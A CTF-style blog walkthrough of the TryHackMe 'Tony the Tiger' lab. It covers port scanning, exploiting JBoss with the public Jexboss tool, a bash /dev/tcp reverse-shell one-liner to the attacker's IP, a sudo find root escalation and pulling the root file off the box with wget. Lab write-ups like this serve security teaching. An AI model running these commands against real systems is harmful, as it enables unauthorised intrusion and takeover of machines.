---
layout: post
title: "Tony the Tiger"
date: 2022-10-20
categories: [Tryhackme, Easy-THM]
tags: [rustscan, JBoss, /etc/hosts, strings, find, SUID, GTFOBins]
image: ../../assets/img/posts/tonythetiger.png 

---

## Description

Learn how to use a Java Serialisation attack in this boot-to-root

|**Room**|[Tony the Tiger](https://tryhackme.com/room/tonythetiger)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[cmnatic](https://tryhackme.com/p/cmnatic)|

---

Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.68.205 --ulimit 5000
```

![image](https://user-images.githubusercontent.com/67465230/187014684-0559b94c-3035-4e1d-95ae-15d420089be2.png)

we got many ports open. 

We can scan these open ports in detail with nmap,

```bash
nmap -sC -sV -p22,80,1090,1091,1098,1099,3873,4446,4712,4713,5445,5455,5501,5500,8009,8080,8083 10.10.68.205 -oN nmap.txt
```

![image](https://user-images.githubusercontent.com/67465230/187014698-6569ed42-34b9-48e7-8ec6-f7546c5cbad7.png)
![image](https://user-images.githubusercontent.com/67465230/187014710-5ccea2cb-2fa0-418d-8b68-3aa530cddef9.png)

Result scan shows that port 22 is running ssh service, port 8080 is running Apache Tomcat server.

Let's explore port 8080 by visiting http://10.10.68.205:8080,

![image](https://user-images.githubusercontent.com/67465230/187014720-9965af0b-1dee-497d-bf6b-e63cee66c94a.png)

we got a webserver of JBOSS which has administration console and other functionalities.

Since, we are not far enough from the true website, let's resolve the domain name with IP address by `10.10.68.205	jboss.thm` in **/etc/hosts** file,

![image](https://user-images.githubusercontent.com/67465230/187014735-cb73c0c7-be61-44be-8500-30466dfba253.png)

Now, visit http://jboss.thm,

![image](https://user-images.githubusercontent.com/67465230/187014748-9cb85c56-73d3-455c-89c9-035c0acb4f48.png)

we got a blog website which do have some posts on it. Nothing fancy! 

After reading the blogs, source code of the webpage carefully, nothing can be found, so I decided to download these 2 pictures for steganography analysis,

![image](https://user-images.githubusercontent.com/67465230/187014756-683eb7d8-9e1f-4ce4-beba-1a1373d9630e.png)
![image](https://user-images.githubusercontent.com/67465230/187014762-5eb5b25a-b546-435c-9b4d-7b44f8728904.png)

Now running the strings commands to read if there any read-able string,

```bash
strings be2sOV9.jpg
```

![image](https://user-images.githubusercontent.com/67465230/187014774-feb4a973-b3e3-4916-9b75-c1288a1879a2.png)
scrolling down a bit, I actually found the flag. 

Let's visit again http://10.10.68.205:8080,

![image](https://user-images.githubusercontent.com/67465230/187014788-b786cd1c-8173-4d16-8e30-dc9867360b30.png)

we got JBOSS webserver.

Navigate to Admin Console,

![image](https://user-images.githubusercontent.com/67465230/187014792-4d310ed0-3e1d-4ef1-b8d7-805f3e2473dd.png)

website requires Credentials to login. 

Now, situation is that we don't have login credentials and we want to exploit this machine, so general idea is to look for the possible exploit on interweb. So looking for the suitable exploit for this machine, I got one - [Jexboss Github](https://github.com/joaomatosf/jexboss)

After viewing how to run the exploit, we can use it on our target,

```python
python jexboss.py -host http://10.10.68.205:8080
```

![image](https://user-images.githubusercontent.com/67465230/187014802-125e031e-21b4-42eb-bf0e-af55a66a9838.png)

after a second, we get a shell type interface where we can execute shell commands. 

Let's check what user we are with `id` command,

![image](https://user-images.githubusercontent.com/67465230/187014811-fe00e676-fed4-4af6-8326-22b27a85e62b.png)

Since we don't have much functionality on this type of shell, we can catch a legit reverse shell and improve it from there.

Using one-liner bash script, we can execute this command to get a reverse shell but first, we need to start a listener using `nc -nvlp 4444` and then executing this command,

```bash
bash -c 'exec bash -i &>/dev/tcp/10.9.0.197/4444 <&1'
```

We caught a shell as cmnatic user,

![image](https://user-images.githubusercontent.com/67465230/187014820-06fbc14e-bb6a-40b3-bd6b-d0210e40b88e.png)

Enumerating home directory,

![image](https://user-images.githubusercontent.com/67465230/187014825-ad7f909b-9567-4099-ab89-f474bf6b4f5f.png)

we got 3 users.

Let's navigate to cmnatic user's directory and list directory content,

![image](https://user-images.githubusercontent.com/67465230/187014831-4d853f3a-0b3d-4ceb-a32f-4584b999c267.png)

we have a text file name to-do.txt. This might be the file which we (cmnatic user) has to perform a certain task.

Reading the content of the file, 

![image](https://user-images.githubusercontent.com/67465230/187014954-02be54f9-ad6e-4235-8c39-668696115504.png)

This note represent how insecure this machine is (wuahahahaha!!).

Taking a look a directory content in jboss user and we got a note file,

![image](https://user-images.githubusercontent.com/67465230/187014961-44b82321-ed70-432c-a1c2-0e4bb405ae55.png)

after reading the note file, user cmnatic has left the password for jboss user.

Since we have jboss user credentials, we can switch to it,

```bash
su jboss
```

Now, since we switched to jboss user, we can see if we can run any binary with `sudo` without providing a password,

```bash
sudo -l
```

![image](https://user-images.githubusercontent.com/67465230/187014968-91c31a75-4bbf-4ad4-a8bd-01b97f55ae4e.png)

we can run **/usr/bin/find** binary without sudo command.

Looking at gtfobins at how I can escalate my privileges by executing find binary, 

![image](https://user-images.githubusercontent.com/67465230/187014995-5c932a40-068c-4504-a7fc-c8def93147fe.png)

Running the above command from GTFObins,

```bash
sudo /usr/bin/find . -exec /bin/sh -p \; -quit
```

![image](https://user-images.githubusercontent.com/67465230/187015011-79b66bcb-6fe3-4d88-88d7-9caac81d5669.png)

Uhh ohh!! We should be root by now but we are not and what's this Illegal option and what does this means? Well, maybe flag **-p** is not allowed to be used.

So, we can try running the same command but without **-p** switch this time,

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

![image](https://user-images.githubusercontent.com/67465230/187015033-d9c1f058-45af-464d-8bab-cf98d2e8b6eb.png)

and we are root!!

Navigating to root directory and enumerating directory,

![image](https://user-images.githubusercontent.com/67465230/187015044-a72f4df4-860f-4aa0-bcdd-01e71d789bf5.png)

we got root.txt file. So I decide to read it but wait, it's not flag but a base64 string.

So, we will first start a python server on victim machine using `python3 -m http.server` and then using wget command to get the file on our machine,

```bash
wget http://10.10.68.205:8000/root.txt
```

Reading the content of the root.txt,

![image](https://user-images.githubusercontent.com/67465230/187015420-f5fdbd68-adfa-4067-a04f-87cc17895fdf.png)

it is base64 string.

Visit [hashes.com](https://hashes.com/en/decrypt/hash) to crack this string,

![image](https://user-images.githubusercontent.com/67465230/187015068-d48abf7b-6411-48d6-b479-4664d0da2185.png)

Cracking at first, it will give some another string so we have to again crack this,

![image](https://user-images.githubusercontent.com/67465230/187015108-312593f6-36f5-4a2d-b671-e8a0536df3c4.png)

after cracking it again, we now get the plain text string.